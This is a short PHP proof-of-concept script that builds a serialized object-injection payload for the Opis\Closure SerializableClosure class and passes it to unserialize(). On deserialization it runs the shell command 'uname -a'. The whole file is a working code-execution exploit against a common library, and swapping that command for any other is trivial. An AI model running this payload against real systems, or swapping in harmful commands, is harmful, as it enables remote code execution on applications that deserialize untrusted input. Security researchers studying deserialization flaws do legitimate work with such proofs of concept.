<?php

include __DIR__.'/vendor/autoload.php';

$poi = 'C:32:"Opis\\Closure\\SerializableClosure":48:{a:1:{s:8:"function";s:19:"system(\'uname -a\');";}}';
unserialize($poi);

?>